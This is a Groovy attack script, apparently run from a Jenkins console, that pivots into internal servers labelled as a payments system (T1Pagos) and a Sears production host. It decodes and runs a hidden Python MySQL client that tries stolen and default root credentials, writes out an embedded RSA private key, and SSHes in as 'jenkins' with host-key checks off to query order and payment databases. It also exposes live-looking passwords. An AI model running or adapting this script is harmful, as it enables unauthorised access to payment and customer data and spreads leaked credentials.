// MySQL query a T1Pagos (172.27.141.4:3306) y SSH pivot a PROD Sears
// T1Pagos ABIERTO en 3306, PROD Sears SSH abierto en 22

def exec = { cmd ->
    def proc = cmd.execute()
    def out = new StringBuilder()
    def err = new StringBuilder()
    proc.consumeProcessOutput(out, err)
    proc.waitForOrKill(30000)
    return [out: out.toString(), err: err.toString(), exitCode: proc.exitValue()]
}

// ============================================================
// PARTE 1: T1Pagos MySQL via Python socket (Python 2 MySQL handshake)
// ============================================================
println "=== T1PAGOS MYSQL QUERY (172.27.141.4:3306) ==="

def t1PyScript = '''
import socket, struct, hashlib, sys, os

def mysql_query(host, port, user, password, db, query):
    """Pure Python MySQL client - Python 2/3 compatible"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(15)
        s.connect((host, port))
        
        # Read handshake
        def read_packet():
            h = s.recv(4)
            if len(h) < 4: raise Exception("Short header")
            l = struct.unpack("<I", h[:3] + b"\\x00")[0]
            d = b""
            while len(d) < l:
                chunk = s.recv(l - len(d))
                if not chunk: raise Exception("Connection closed")
                d += chunk
            return h[3], d  # (sequence, data)
        
        seq, greeting = read_packet()
        if greeting[0:1] == b"\\xff":
            raise Exception("Error packet: " + greeting[3:].decode("latin1", errors="replace"))
        
        # Extract server info
        proto = struct.unpack("B", greeting[0:1])[0]
        null_pos = greeting.index(b"\\x00", 1)
        server_version = greeting[1:null_pos].decode("latin1")
        
        # auth data (scramble)
        auth1 = greeting[null_pos+5:null_pos+13]
        filler_pos = greeting.index(b"\\x00", null_pos+13+3)
        auth2 = greeting[filler_pos+1:filler_pos+13]
        auth_data = auth1 + auth2
        
        # Capabilities
        cap = struct.unpack("<H", greeting[null_pos+1:null_pos+3])[0]
        
        # Hash password
        if password:
            pwd_bytes = password.encode("utf-8") if isinstance(password, str) else password
            hash1 = hashlib.sha1(pwd_bytes).digest()
            hash2 = hashlib.sha1(hash1).digest()
            xored = bytes([a ^ b for a, b in zip(hashlib.sha1(auth_data + hash2).digest(), hash1)])
        else:
            xored = b""
        
        # Build auth response packet
        client_caps = 0x000ea685  # standard flags
        charset = 8  # latin1
        
        pkt = struct.pack("<IIB23s", client_caps, 0xffffff, charset, b"\\x00"*23)
        pkt += user.encode("utf-8") + b"\\x00"
        pkt += struct.pack("B", len(xored)) + xored
        if db:
            pkt += db.encode("utf-8") + b"\\x00"
        else:
            pkt += b"\\x00"
        
        # Send auth
        header = struct.pack("<I", len(pkt))[:3] + b"\\x01"
        s.sendall(header + pkt)
        
        # Read response
        seq2, resp = read_packet()
        if resp[0:1] == b"\\xff":
            err_code = struct.unpack("<H", resp[1:3])[0]
            err_msg = resp[9:].decode("latin1", errors="replace") if len(resp) > 9 else resp[3:].decode("latin1", errors="replace")
            raise Exception("Auth error %d: %s" % (err_code, err_msg))
        
        print("AUTH OK - MySQL %s" % server_version)
        
        # COM_QUERY
        query_bytes = query.encode("utf-8")
        q_pkt = b"\\x03" + query_bytes
        q_header = struct.pack("<I", len(q_pkt))[:3] + b"\\x00"
        s.sendall(q_header + q_pkt)
        
        # Read result
        result_data = b""
        while True:
            try:
                s.settimeout(10)
                chunk = s.recv(65536)
                if not chunk: break
                result_data += chunk
                if len(result_data) > 100000: break
            except:
                break
        
        s.close()
        
        # Parse result (simple text extraction)
        lines = []
        i = 0
        while i < len(result_data):
            if i + 4 > len(result_data): break
            plen = struct.unpack("<I", result_data[i:i+3] + b"\\x00")[0]
            if plen == 0 or i + 4 + plen > len(result_data): break
            packet = result_data[i+4:i+4+plen]
            i += 4 + plen
            if packet[0:1] in (b"\\x00", b"\\xff", b"\\xfe"): continue
            # Extract string fields
            pos = 0
            row = []
            while pos < len(packet):
                if packet[pos:pos+1] == b"\\xfb":
                    row.append("NULL")
                    pos += 1
                elif packet[pos] < 251:
                    flen = packet[pos]
                    row.append(packet[pos+1:pos+1+flen].decode("utf-8", errors="replace"))
                    pos += 1 + flen
                elif packet[pos] == 0xfc:
                    flen = struct.unpack("<H", packet[pos+1:pos+3])[0]
                    row.append(packet[pos+3:pos+3+flen].decode("utf-8", errors="replace"))
                    pos += 3 + flen
                else:
                    break
            if row:
                lines.append(" | ".join(row))
        
        print("\\n".join(lines[:50]))
        return True
    except Exception as e:
        print("ERROR: %s" % str(e))
        return False

# Test credentials
HOST = "172.27.141.4"
PORT = 3306

creds = [
    ("app_t1", "wUt22Us2CUh#+M=", "payment_t1", "SHOW TABLES"),
    ("app_t1", "wUt22Us2CUh#+M=", "", "SHOW DATABASES"),
    ("root", "", "", "SHOW DATABASES"),
    ("root", "root", "", "SHOW DATABASES"),
]

for user, pwd, db, qry in creds:
    print("\\n--- Trying %s@%s ---" % (user, HOST))
    ok = mysql_query(HOST, PORT, user, pwd, db, qry)
    if ok:
        print("\\n--- FULL QUERY: SHOW DATABASES ---")
        mysql_query(HOST, PORT, user, pwd, "", "SHOW DATABASES")
        print("\\n--- COUNT payment_t1 tables ---")
        mysql_query(HOST, PORT, user, pwd, "payment_t1", "SELECT table_name, table_rows FROM information_schema.tables WHERE table_schema=\\'payment_t1\\'")
        break
'''

def encT1 = t1PyScript.bytes.encodeBase64().toString()
def t1Cmd = ["bash", "-c", "echo '${encT1}' | base64 -d > /tmp/t1mysql.py && python /tmp/t1mysql.py 2>&1"]
def t1Proc = t1Cmd.execute()
def t1Out = new StringBuilder()
t1Proc.consumeProcessOutput(t1Out, new StringBuilder())
t1Proc.waitForOrKill(45000)
println t1Out.toString()

// ============================================================
// PARTE 2: SSH a PROD Sears (172.27.141.24:22) con RSA key
// ============================================================
println "\n=== SSH PIVOT A PROD SEARS (172.27.141.24:22) ==="

// Escribir la RSA key a un archivo temporal
def rsaKey = """-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEApeSSUiBjXCxjR9bWb90AUJ0SbLANv030lZvUY2Bc7a4VZPXc
gfvTSAmIvMiNiEPR/+hsrUhHtDtz55JqtKzk4jBxBUUFcaIreqOmKyxv3hCEmMAu
FLPiFTdiIkDs3Wpu+6JNney6PLuxOlffhA4zuS4JpNZfZz1EeEC3AIK3zLLbSp9Y
8EFJ4oO8QAZ65n4dS/f/G+U/qckJjv9pCB/c64hun3h4Ilw34Bx24q4jOTTy1HHz
AzWEGhjBLZqaNf+mxDTulXy3LCi5esPE4ILjoXFHrPD2t9hF1h6JqRUjNbsP+AMt
mFUyShPBoWEy/t/8Z4CislFQHtRyMIScbo4QywIBIwKCAQEAoScvDfOTuKAl7gPm
QMgO7zl/nMhH3mj8OZAQJgXWnb8NeATHlDZ1eS3VSazhQosGg5FToQRi6ZjW/jZ2
SRz7meXqImBObmMFqlXUnvf3pIUTGAslczJmmERt9WOkRM3K5dDdr1r+Dxy6yvZG
2A3L2HXde45rTljGK6yUhCc2NI7sr9UFoTMZ6Tzjrk8OhWdLUxDtQVwwpacDwahW
XbaV5B+vnqS2MTBJ61jZpCVRl504NFO2rg2O1Lg3E8CgzLDY7A159gAG5xKaiVM3
6JUBp377x0OJNhCunPI0q/UoyGvf5VJwjoLflTbZqrQl2FpNA7FFiLa9eJqsWYJV
8LNliwKBgQDUc0bi+0M3ByuMFqRgCAIr7mv6KTA5kF08cVQNIzL5bAO3n+ejIKRf
RFBmjKUGAuz6v4FgE8pX892IUSt/fOzd/g4Z4nYuntmOSHmsStwWyNhfobbR0c9O
bJnxjtCFI1mjBDSkJYVZ0MQvQ9sgDIvAH4sVq3sWgDtdILPPI5opSwKBgQDH5htK
g8Hwp3tj5uOL677JePqYPnvE9m0NA34SC/w6I75zJ4zsR42qof+ow6Z2ZYB6dal1
AALc4dfxGuyTT8YltQnmNcpFNgdP4Skiy+A8FZYwJ4OuPXBDqdaPDuZdgEy7LWMV
lNCnBVrfeRfr/QZWac4fzOzvC9u9/vfPLYaGgQKBgQDOYVrN3iQJke/J6hwFhB9d
4EuijmlcfZxmmfng4F1nUvxL+mv9jWx5zVVq7wa1Ye2F3prvnjJGz6QAw+Ecwn+z
FA2yvrvyxjJs9fKKHNXM/Z790EsyOYeOAxkzzJAMTjnRjw6Q0/3iOIQQqFE1E4Bx
fbpPkKN08ZjA3fCAE/TXpwKBgQDCL/1BEkdezpUfOBA+x8CmdYW4dzZnkEytjl02
GkV6TpvAUk5h3xvnlg5MK8ZHIMXzTbqO6hFo22QOybKduzWDty4wFv8BZ69U6Vsp
HdKDgq8ndtewk3Re/MHMzKVE4wi11FGf76Yel3zZFoxEVOGVxd4thT3vh9zHMjKO
voKuiwKBgFZ4LHsqhnU/o7DBdV6FB67pWtrVCZNGNf30Swd9PFzGJbSCXRKJ9Iwd
jYqClYgkyxylo5H6Nzl0Y7wGqKoGBWMIOvpkG0mrSOYMB0iGwXnWS1g94xeRw32k
CtOrnvIVC8SKdmm5H+uzoN+WpSwC+oRkS7cIGjzthuw7omygk1ng
-----END RSA PRIVATE KEY-----"""

// Escribir key y hacer SSH con StrictHostKeyChecking=no
def sshCmd = """
mkdir -p /tmp/ssh_pivot
echo '${rsaKey.replace("'", "'\\''")}' > /tmp/ssh_pivot/id_rsa
chmod 600 /tmp/ssh_pivot/id_rsa
# Test SSH to PROD Sears
ssh -i /tmp/ssh_pivot/id_rsa -o StrictHostKeyChecking=no -o ConnectTimeout=10 -o BatchMode=yes \\
    jenkins@172.27.141.24 'id; hostname; mysql -u apifincadob -p"nNzy]Ku2Ah=u%y1I" -h 127.0.0.1 -e "SELECT COUNT(*) FROM tienda.pedidos" 2>&1 | head -5' 2>&1
echo "SSH_EXIT: \$?"
"""
def sshResult = exec(["bash", "-c", sshCmd])
println sshResult.out
println "SSH ERR: ${sshResult.err}"

// Also try SSH to 172.27.141.4 (T1Pagos server)
println "\n--- SSH to T1Pagos server (172.27.141.4) ---"
def sshT1 = """
ssh -i /tmp/ssh_pivot/id_rsa -o StrictHostKeyChecking=no -o ConnectTimeout=10 -o BatchMode=yes \\
    jenkins@172.27.141.4 'id; hostname; mysql -u app_t1 -p"wUt22Us2CUh#+M=" payment_t1 -e "SHOW TABLES" 2>&1 | head -10' 2>&1
echo "SSH_EXIT: \$?"
"""
def sshT1Result = exec(["bash", "-c", sshT1])
println sshT1Result.out
println "SSH T1 ERR: ${sshT1Result.err}"

println "\n=== FIN PIVOT ==="
